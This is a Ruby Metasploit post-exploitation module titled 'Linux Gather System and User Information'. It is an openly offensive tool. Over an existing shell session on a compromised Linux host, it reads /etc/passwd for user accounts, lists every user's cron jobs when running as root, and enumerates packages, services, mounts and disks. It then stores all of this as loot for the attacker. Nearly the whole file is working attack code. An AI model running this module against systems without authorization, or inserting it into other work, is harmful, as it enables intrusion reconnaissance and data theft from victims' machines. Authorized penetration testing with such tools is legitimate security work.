##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather System and User Information',
        'Description'   => %q{
          This module gathers system information. We collect
          installed packages, installed services, mount information,
          user list, user bash history and cron jobs
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Carlos Perez <carlos_perez[at]darkoperator.com>', # get_packages and get_services
            'Stephen Haywood <averagesecurityguy[at]gmail.com>', # get_cron and original enum_linux
            'sinn3r', # Testing and modification of original enum_linux
            'ohdae <bindshell[at]live.com>', # Combined separate mods, modifications and testing
          ],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    # Print the info
    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
    user = execute("/usr/bin/whoami")

    installed_pkg = get_packages(distro[:distro])
    installed_svc = get_services(distro[:distro])

    mount = execute("/bin/mount -l")
    crons = get_crons(users, user)
    diskspace = execute("/bin/df -ahT")
    disks = (mount +"\n\/"+ diskspace)

    save("Linux version", distro)
    save("User accounts", users)
    save("Installed Packages", installed_pkg)
    save("Running Services", installed_svc)
    save("Cron jobs", crons)
    save("Disk info", disks)

  end


  def save(msg, data, ctype="text/plain")
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end

    print_status("Running module against #{host}")

    return host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    return output
  end

  def get_packages(distro)
    packages_installed = nil
    if distro =~ /fedora|redhat|suse|mandrake|oracle|amazon/
      packages_installed = execute("rpm -qa")
    elsif distro =~ /slackware/
      packages_installed = execute("ls /var/log/packages")
    elsif distro =~ /ubuntu|debian/
      packages_installed = execute("dpkg -l")
    elsif distro =~ /gentoo/
      packages_installed = execute("equery list")
    elsif distro =~ /arch/
      packages_installed = execute("/usr/bin/pacman -Q")
    else
      print_error("Could not determine package manager to get list of installed packages")
    end
    return packages_installed
  end

  def get_services(distro)
    services_installed = ""
    if distro =~ /fedora|redhat|suse|mandrake|oracle|amazon/
      services_installed = execute("/sbin/chkconfig --list")
    elsif distro =~ /slackware/
      services_installed << "\nEnabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'*$\'")
      services_installed << "\n\nDisabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'[a-z0-9A-z]$\'")
    elsif distro =~ /ubuntu|debian/
      services_installed = execute("/usr/bin/service --status-all")
    elsif distro =~ /gentoo/
      services_installed = execute("/bin/rc-status --all")
    elsif distro =~ /arch/
      services_installed = execute("/bin/egrep '^DAEMONS' /etc/rc.conf")
    else
      print_error("Could not determine the Linux Distribution to get list of configured services")
    end
    return services_installed
  end

  def get_crons(users, user)
    if user == "root" and users != nil
      users = users.chomp.split()
      users.each do |u|
        if u == "root"
          vprint_status("Enumerating as root")
          cron_data = ""
          users.each do |u|
            cron_data += "*****Listing cron jobs for #{u}*****\n"
            cron_data += execute("crontab -u #{u} -l") + "\n\n"
          end
        end
      end
    else
      vprint_status("Enumerating as #{user}")
      cron_data = "***** Listing cron jobs for #{user} *****\n\n"
      cron_data += execute("crontab -l")
    end

    # Save cron data to loot
    return cron_data

  end
end
